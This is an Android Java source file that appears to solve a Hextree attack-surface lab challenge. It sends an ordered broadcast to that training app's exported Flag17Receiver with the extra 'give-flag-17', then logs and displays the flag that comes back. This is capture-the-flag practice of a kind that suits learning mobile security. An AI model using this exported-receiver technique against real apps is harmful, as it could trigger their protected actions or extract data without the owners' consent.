package niraj.patali.orderedbroadcast;

import android.app.Activity;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.os.Handler;
import android.util.Log;
import android.widget.Toast;

public class MainActivity extends Activity {

    private static final String TAG = "SenderActivity";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        sendFlagOrderedBroadcast();
    }

    private void sendFlagOrderedBroadcast() {
        Intent intent = new Intent();
        intent.setClassName("io.hextree.attacksurface","io.hextree.attacksurface.receivers.Flag17Receiver");
        intent.putExtra("flag", "give-flag-17");
        sendOrderedBroadcast(
                intent,
                null,
                new BroadcastReceiver() {
                    @Override
                    public void onReceive(Context context, Intent intent) {        int resultCode = getResultCode();
                        String resultData = getResultData();
                        Bundle resultExtras = getResultExtras(true);

                        // Log the final result code and data
                        Log.d(TAG, "Final Ordered Broadcast Result: code=" + resultCode + ", data=" + resultData);

                        if (resultExtras != null) {
                            // Log the entire extras Bundle for debugging
                            Log.d(TAG, "Final Broadcast Extras: " + resultExtras.toString());

                            // Extract the flag string from the extras using the key "flag"
                            String flagValue = resultExtras.getString("flag");
                            if (flagValue != null) {
                                Log.d(TAG, "Parsed flag value: " + flagValue);
                            } else {
                                Log.d(TAG, "No flag value found in extras.");
                            }
                        } else {
                            Log.d(TAG, "No extras returned in the broadcast result.");
                        }

                        // Display a Toast message with the final broadcast response
                        Toast.makeText(context,
                                "Broadcast Response: code=" + resultCode + ", data=" + resultData,
                                Toast.LENGTH_LONG).show();
                    }

                },
                new Handler(), // Handler for the final receiver callback.
                0,             // initial result code
                null, // initial result data
                null           // initial extras
        );
    }
}
